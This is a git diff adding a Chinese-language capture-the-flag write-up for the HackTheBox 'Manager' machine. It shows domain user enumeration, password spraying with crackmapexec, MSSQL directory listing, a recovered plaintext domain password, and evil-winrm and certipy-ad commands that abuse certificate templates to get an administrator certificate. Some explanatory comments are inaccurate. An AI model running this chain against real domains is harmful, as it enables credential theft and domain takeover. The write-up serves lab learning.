@@ -513,10 +513,78 @@ PORT    STATE SERVICE
 
 使用[kerbrute](https://github.com/ropnop/kerbrute)枚举ad域里的用户
 得到user.txt
-
+```
+ryan
+cheng
+raven
+guest
+administrator
+operator
+jinwoo
+zhong
+chinhaw
+```
 使用crackmapexec进行密码喷射(password spraying)
-`crackmapexec smb manager.htb -u users -p passwords`
+`crackmapexec smb manager.htb -u users -p users`
+得到一个smb登录凭证`operator/operator`
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240307221329.png)
 
+没有共享,尝试mssql
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240307221710.png)
+
+尝试mssql登录
+`impacket-mssqlclient -port 1433 manager.htb/operator:operator@10.10.11.236 -window `
+
+执行`xp_dirtree 'C:\inetpub\wwwroot', 1, 1;`读取iis web目录下的文件
+
+发现了
+```text                                                                                          
+website-backup-27-07-23-old.zip    
+```
+下载并发现了一个old.config.xml
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+   <server>
+      <host>dc01.manager.htb</host>
+      <open-port enabled="true">389</open-port>
+      <secure-port enabled="false">0</secure-port>
+      <search-base>dc=manager,dc=htb</search-base>
+      <server-type>microsoft</server-type>
+      <access-user>
+         <user>raven@manager.htb</user>
+         <password>R4v3nBe5tD3veloP3r!123</password>
+      </access-user>
+      <uid-attribute>cn</uid-attribute>
+   </server>
+   <search type="full">
+      <dir-list>
+         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
+      </dir-list>
+   </search>
+</ldap-conf>
+
+```
+得到raven的账号密码
+
+使用`evil-winrm`登录
+`evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'`
+
+#### root
+......
+总之是发现了aad证书相关的东西
+然后使用`certipy-ad`这个工具创建一个'officer'账户来为我授权
+
+```bash
+certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+#创建一个新的ca机构'manager-DC01-CA',这个机构的管理员为raven
+certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123'
+#启用名为 SubCA 的证书模板。这个模板通常用于签发子CA证书。
+certipy-ad req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn 'administrator@manager.htb'
+#执行这个命令后,将向 manager-DC01-CA 证书颁发机构请求签发一个新的子 CA 证书。这个子 CA 证书将被颁发给域 manager.htb,并使用启用的 SubCA 模板进行签发。同时,证书中将包含 administrator@manager.htb 的用户主体名称(UPN)。
+certipy-ad ca -ca 'manager-DC01-CA' -issue-request 22 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123*'
+#manager-DC01-CA 证书颁发机构将签发之前通过 certipy-ad req 命令提交的请求ID为22的证书请求，并生成一个新的子CA证书。
+```
 ### Sandworm
 #### user
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230722155953.png)
